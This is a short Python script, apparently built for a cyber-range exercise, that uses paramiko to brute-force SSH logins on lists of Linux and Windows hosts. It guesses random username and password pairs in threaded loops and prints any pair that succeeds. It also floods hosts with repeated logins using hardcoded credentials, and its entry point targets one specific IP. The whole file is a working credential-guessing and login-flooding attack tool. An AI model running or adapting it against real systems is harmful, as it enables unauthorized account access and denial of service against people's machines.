import sys
from pathlib import Path

sys.path.append(str(Path(__file__).parent.parent))

import paramiko
import threading
import random
import time
from utils import usernames, passwords, LINUX_TARGET_IPS, WINDOWS_TARGET_IPS

def correct_login_flood_work(target_host, username, password):
    while True:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(target_host, username=username, password=password, timeout=2)
        except paramiko.AuthenticationException:
            pass
        ssh.close()
        time.sleep(random.randrange(30)/1000)

def correct_login_flood(target_host, username, password):
    t = threading.Thread(target=correct_login_flood_work, args=(target_host, username, password), daemon=True)
    t.start()
    return t

def incorrect_login_flood_work(target_host):
    while True:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        u = random.choice(usernames)
        p = random.choice(passwords)
        try:
            ssh.connect(target_host, username=u, password=p, timeout=2)
            print(f"SUCCESS: {u}:{p}")
        except paramiko.AuthenticationException:
            pass
        except:
            ...
        ssh.close()
        time.sleep(random.randrange(30)/1000)

def incorrect_login_flood(target_host):
    t = threading.Thread(target=incorrect_login_flood_work, args=(target_host,), daemon=True)
    t.start()
    return t

def main():
    ssh_threads = []
    for ip in LINUX_TARGET_IPS + WINDOWS_TARGET_IPS:
        ssh_threads.append(incorrect_login_flood(ip))
    linux_login_threads = []
    windows_login_threads = []
    for ip in LINUX_TARGET_IPS:
        linux_login_threads.append(correct_login_flood(ip, "cyberrange", "Cyberrange123!"))
    for ip in WINDOWS_TARGET_IPS:
        windows_login_threads.append(correct_login_flood(ip, "sjohnson", "UwU?OwO!67")) # ask greyteam for correct creds
    print("Flooding...")
    input("Press Enter to quit:")

if __name__ == "__main__":
    # main()
    t = incorrect_login_flood("100.65.7.253")
    input()